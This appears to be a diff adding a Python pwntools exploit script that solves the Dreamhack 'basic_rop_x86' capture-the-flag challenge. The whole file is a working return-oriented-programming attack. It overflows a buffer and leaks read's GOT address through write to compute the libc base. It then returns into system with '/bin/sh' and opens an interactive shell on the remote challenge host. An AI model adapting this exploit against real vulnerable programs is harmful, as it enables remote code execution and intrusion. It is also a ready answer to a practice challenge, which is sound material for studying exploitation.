@@ -1,0 +1,52 @@
+from pwn import *
+
+#p=process('./basic_rop_x86')
+p=remote('host3.dreamhack.games',13459)
+e=ELF('./basic_rop_x86')
+libc=ELF('./libc.so.6')
+
+#ROP class object
+r=ROP(e)
+
+read_plt=e.plt['read']
+read_got=e.got['read']
+write_plt=e.plt['write']
+write_got=e.got['write']
+main=e.symbols['main']
+read_offset=libc.symbols['read']
+system_offset=libc.symbols['system']
+sh_offset=list(libc.search(b"/bin/sh"))[0] #return iterator
+
+pop_ret=r.find_gadget(['pop ebp', 'ret'])[0]
+pop2_ret=r.find_gadget(['pop edi','pop ebp','ret'])[0]
+pop3_ret=r.find_gadget(['pop esi','pop edi','pop ebp','ret'])[0]
+
+payload=b"A"*0x48
+payload+=p32(write_plt)
+payload+=p32(pop3_ret)+p32(1)+p32(read_got)+p32(4)
+payload+=p32(main)
+
+#receive read_got addr
+p.send(payload)
+p.recvuntil(b"A"*0x40)
+read=u32(p.recvn(4))
+
+libc_base=read-read_offset
+system=libc_base+system_offset
+sh=libc_base+sh_offset
+
+print(hex(libc_base))
+print(hex(read))
+print(hex(system))
+
+payload=b"A"*0x48
+payload+=p32(system)
+payload+=p32(pop_ret)+p32(sh)
+
+print(hex(read))
+
+p.send(payload)
+p.recvuntil(b"A"*0x40)
+
+p.interactive()
+
